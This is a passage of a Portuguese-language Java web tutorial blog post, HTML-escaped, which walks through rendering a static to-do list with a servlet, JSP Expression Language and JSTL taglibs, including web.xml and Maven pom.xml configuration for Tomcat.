    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;setNome&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="nf"&gt;getNome&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E o &lt;em&gt;servlet&lt;/em&gt; deverá ficar parecido com o seguinte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// src/main/java/webapp/OlaMundoServlet.java&lt;/span&gt;
&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nn"&gt;webapp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="o"&gt;(...)&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;webapp.model.Tarefa&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="nd"&gt;@WebServlet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urlPatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;OlaMundoServlet&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="n"&gt;HttpServlet&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;service&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HttpServletResponse&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;ServletException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;tarefas&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;of&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;
                &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Tarefa A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt;
                &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Tarefa B&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt;
                &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Tarefa&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Tarefa C&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;setAttribute&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;tarefas&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tarefas&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;

        &lt;span class="n"&gt;RequestDispatcher&lt;/span&gt; &lt;span class="n"&gt;rd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRequestDispatcher&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/WEB-INF/index.jsp&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;rd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forward&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note que estamos passando uma lista (estática) de tarefas como atributo da requisição (&lt;code&gt;req.setAttribute&lt;/code&gt;) que acionará o &lt;code&gt;index.jsp&lt;/code&gt;. O próximo passo é imprimir tais tarefas no &lt;em&gt;JSP&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;(Unified) Expression Language&lt;/h3&gt;
&lt;p&gt;O &lt;em&gt;JSP&lt;/em&gt; possui um recurso chamado de &lt;em&gt;Scriptlets&lt;/em&gt;, que permite que você escreva de forma explícita código &lt;em&gt;Java&lt;/em&gt; em arquivos &lt;em&gt;JSP&lt;/em&gt; através de &lt;em&gt;scripts&lt;/em&gt; (mais ou menos o que podemos ver em linguagens como &lt;em&gt;PHP&lt;/em&gt; e &lt;em&gt;ASP&lt;/em&gt;). Se você parar para considerar que &lt;em&gt;JSP&lt;/em&gt; é no fundo código &lt;em&gt;Java&lt;/em&gt; imprimindo &lt;em&gt;HTML&lt;/em&gt;, essa ideia não parece ser tão louca assim.&lt;/p&gt;
&lt;p&gt;Oras... estamos em 2019, e já estamos cansados de saber que escrever &lt;em&gt;HTML&lt;/em&gt; misturado com lógica de negócios não é uma boa ideia.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/java-sauron.jpeg" width="740" height="555" title="Renda-se a Sauron! Digo, Java! (inews.co.uk)" alt="Renda-se a Sauron! Digo, Java! (inews.co.uk)"&gt;&lt;/p&gt;
&lt;p&gt;A partir da versão 2.0 da especificação do &lt;em&gt;JSP&lt;/em&gt; temos uma alternativa chamada "Expression Language" (ou &lt;em&gt;Unified Expression Language&lt;/em&gt;, a partir da versão 2.1).&lt;/p&gt;
&lt;p&gt;Segundo o &lt;a href="https://en.wikipedia.org/wiki/Unified_Expression_Language" title="Leia mais sobre EL"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Java Unified Expression Language is a special purpose programming language mostly used in Java web applications for embedding expressions into web pages. The Java specification writers and expert groups of the Java web-tier technologies have worked on a unified expression language which was first included in the JSP 2.1 specification (JSR-245), and later specified by itself in JSR-341, part of Java EE 7.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Com ela, ao invés de escrevermos isso (quem teve contato com &lt;em&gt;PHP&lt;/em&gt; achará muito familiar):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;li&amp;gt;&amp;lt;%= tarefa.getNome() %&amp;gt;&amp;lt;/li&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Escrevemos isso (similar a qualquer &lt;em&gt;engine&lt;/em&gt; de &lt;em&gt;templates&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;li&amp;gt;${tarefa.nome}&amp;lt;li&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A &lt;em&gt;EL&lt;/em&gt; não é capaz de realizar operações como um &lt;code&gt;for&lt;/code&gt;, por exemplo. Para isso, se quisermos "fugir" do uso de &lt;em&gt;scripts&lt;/em&gt;, temos um outro recurso à disposição.&lt;/p&gt;
&lt;h3&gt;Taglibs&lt;/h3&gt;
&lt;p&gt;Voltando a citar o &lt;a href="https://www.caelum.com.br/apostila-java-web/usando-taglibs/" title="Usando Taglibs"&gt;material da &lt;em&gt;Caelum&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A Sun percebeu que os programadores estavam abusando do código Java no JSP e tentou criar algo mais "natural" (um ponto um tanto quanto questionável da maneira que foi apresentada no início), sugerindo o uso de tags para substituir trechos de código.&lt;/p&gt;
&lt;p&gt;O resultado final é um conjunto de tags (uma tag library, ou taglib) padrão, que possui, entre outras tags, a funcionalidade de instanciar objetos através do construtor sem argumentos.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Com esse recurso, ao invés de escrevermos isso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;ul&amp;gt;
&amp;lt;% for (Tarefa tarefa : tarefas ) { %&amp;gt;
    &amp;lt;li&amp;gt;&amp;lt;%= tarefa.getNome() %&amp;gt;
&amp;lt;% } %&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Escreveremos isso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;%@ taglib uri=&amp;quot;http://java.sun.com/jsp/jstl/core&amp;quot; prefix=&amp;quot;c&amp;quot; %&amp;gt;

(...)

&amp;lt;ul&amp;gt;
    &amp;lt;c:forEach var=&amp;quot;tarefa&amp;quot; items=&amp;quot;${tarefas}&amp;quot;&amp;gt;
        &amp;lt;li&amp;gt;${tarefa.nome}&amp;lt;li&amp;gt;
    &amp;lt;/c:forEach&amp;gt;
&amp;lt;/ul&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E embora possa ser tentador cair na armadilha de discutir qual opção é melhor, eu diria que &lt;strong&gt;nenhuma delas&lt;/strong&gt;. Considere uma terceira alternativa, como o &lt;a href="https://www.thymeleaf.org/doc/articles/thvsjsp.html" title="Spring MVC view layer: Thymeleaf vs. JSP"&gt;&lt;em&gt;Thymeleaf&lt;/em&gt;&lt;/a&gt;, e não invista muito esforço nesse debate. Estamos em 2019, e discutir sobre &lt;em&gt;JSP x Taglibs&lt;/em&gt; é "tão anos 2000".&lt;/p&gt;
&lt;p&gt;Por hora, vamos "aceitar" a combinação &lt;em&gt;EL&lt;/em&gt; + &lt;em&gt;JSTL&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Aplicando as alterações&lt;/h3&gt;
&lt;p&gt;Primeiro, precisamos alterar os atributos do nó &lt;code&gt;web-app&lt;/code&gt;, do arquivo &lt;code&gt;web.xml&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE web-app PUBLIC&lt;/span&gt;
&lt;span class="cp"&gt;&amp;quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&amp;quot;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;quot;http://java.sun.com/dtd/web-app_2_3.dtd&amp;quot; &amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;web-app&lt;/span&gt;
        &lt;span class="na"&gt;xmlns=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://java.sun.com/xml/ns/javaee&amp;quot;&lt;/span&gt;
        &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;
        &lt;span class="na"&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://java.sun.com/xml/ns/javaee&lt;/span&gt;
&lt;span class="s"&gt;http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;3.0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;display-name&amp;gt;&lt;/span&gt;Archetype Created Web Application&lt;span class="nt"&gt;&amp;lt;/display-name&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/web-app&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Na sequência, precisamos instalar a interface de &lt;em&gt;JSTL&lt;/em&gt;, bem como sua implementação. Altere o arquivo &lt;code&gt;pom.xml&lt;/code&gt; para ficar semelhante ao seguinte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;project&lt;/span&gt; &lt;span class="na"&gt;xmlns=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://maven.apache.org/POM/4.0.0&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;xmlns:xsi=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;
        &lt;span class="na"&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;modelVersion&amp;gt;&lt;/span&gt;4.0.0&lt;span class="nt"&gt;&amp;lt;/modelVersion&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;com.kplaube&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;ola-mundo&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;packaging&amp;gt;&lt;/span&gt;war&lt;span class="nt"&gt;&amp;lt;/packaging&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.0-SNAPSHOT&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;name&amp;gt;&lt;/span&gt;ola-mundo Maven Webapp&lt;span class="nt"&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;url&amp;gt;&lt;/span&gt;http://maven.apache.org&lt;span class="nt"&gt;&amp;lt;/url&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;properties&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;maven.compiler.source&amp;gt;&lt;/span&gt;11&lt;span class="nt"&gt;&amp;lt;/maven.compiler.source&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;maven.compiler.target&amp;gt;&lt;/span&gt;11&lt;span class="nt"&gt;&amp;lt;/maven.compiler.target&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/properties&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;dependencies&amp;gt;&lt;/span&gt;
        &lt;span class="c"&gt;&amp;lt;!-- Servlet --&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;javax.servlet&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;javax.servlet-api&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;4.0.1&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;scope&amp;gt;&lt;/span&gt;provided&lt;span class="nt"&gt;&amp;lt;/scope&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;

        &lt;span class="c"&gt;&amp;lt;!-- JSTL --&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;javax.servlet&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;jstl&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.1.2&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;taglibs&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;standard&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.1.2&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;taglibs&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;c&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;1.1.2&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;type&amp;gt;&lt;/span&gt;tld&lt;span class="nt"&gt;&amp;lt;/type&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/dependencies&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;build&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;finalName&amp;gt;&lt;/span&gt;ola-mundo&lt;span class="nt"&gt;&amp;lt;/finalName&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;plugins&amp;gt;&lt;/span&gt;
            &lt;span class="c"&gt;&amp;lt;!-- Tomcat plugin --&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;plugin&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.tomcat.maven&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;tomcat7-maven-plugin&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;2.2&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;path&amp;gt;&lt;/span&gt;/&lt;span class="nt"&gt;&amp;lt;/path&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;contextReloadable&amp;gt;&lt;/span&gt;true&lt;span class="nt"&gt;&amp;lt;/contextReloadable&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/plugin&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/plugins&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/build&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/project&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Já o &lt;em&gt;HTML&lt;/em&gt;, no arquivo &lt;code&gt;index.jsp&lt;/code&gt;, deve ficar parecido com o seguinte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;&amp;lt;%@&lt;/span&gt; &lt;span class="n"&gt;taglib&lt;/span&gt; &lt;span class="n"&gt;uri&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://java.sun.com/jsp/jstl/core&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;prefix&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;c&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;%&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;TODO list&lt;span class="nt"&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;label&amp;gt;&lt;/span&gt;
            Tarefa:
            &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nome&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;required=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;required&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;

        &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Salvar&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;ul&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;c:forEach&lt;/span&gt; &lt;span class="na"&gt;var=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;tarefa&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;items=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;${tarefas}&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;li&amp;gt;&lt;/span&gt;${tarefa.nome}&lt;span class="nt"&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/c:forEach&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Reinicie o &lt;em&gt;Tomcat&lt;/em&gt;, e ao acessar o endereço &lt;code&gt;http://localhost:8080&lt;/code&gt;, você deve obter o seguinte resultado:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/java-jstl-exemplo.png" width="640" height="391" title="Exemplo de visualização com aplicação de Taglibs" alt="Exemplo de visualização com aplicação de Taglibs"&gt;&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Embora haja uma forma programática de formularmos o &lt;em&gt;deployment descriptor&lt;/em&gt; da aplicação, ainda assim precisamos lidar com escrita de &lt;em&gt;XML&lt;/em&gt; que em muitos casos parecem ser alterações exotéricas. Mesmo com a &lt;em&gt;Servlet 3.0&lt;/em&gt;, não escapamos dessa espécie de "karma" que é lidar com a linguagem &lt;em&gt;Java&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;No entanto, &lt;em&gt;frameworks&lt;/em&gt; como o &lt;em&gt;Spring&lt;/em&gt; tendem a eliminar essa necessidade, tornando tudo um pouco mais interessante, principalmente para desenvolvedores acostumados com ambientes mais "dinâmicos" como &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, &lt;em&gt;Ruby&lt;/em&gt; ou &lt;em&gt;Node.js&lt;/em&gt;. Mas infelizmente, não atacaremos essa transição no próximo &lt;em&gt;post&lt;/em&gt;...&lt;/p&gt;
&lt;p&gt;No próximo artigo, finalizaremos a prototipação com a parte da adição da tarefa. Abordaremos brevemente filtros e &lt;em&gt;listeners&lt;/em&gt;, e fecharemos essa parte da trinca &lt;em&gt;Servlet + Tomcat + Maven&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até lá.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.caelum.com.br/apostila-java-web/javaserver-pages/"&gt;Caelum: Apostila Java para Desenvolvimento Web - JavaServer Pages&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.caelum.com.br/apostila-java-web/servlets/"&gt;Caelum: Apostila Java para Desenvolvimento Web - Servlets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dzone.com/articles/an-overview-servlet-30"&gt;DZone: An Overview of Servlet 3.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.javatpoint.com/life-cycle-of-a-servlet"&gt;JavaTPoint: Life Cycle of a Servlet (Servlet Life Cycle)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.javatpoint.com/servlet-with-annotation"&gt;JavaTPoint: Servlet with Annotation (feature of servlet3)&lt;/a&gt;&lt;/li&gt;
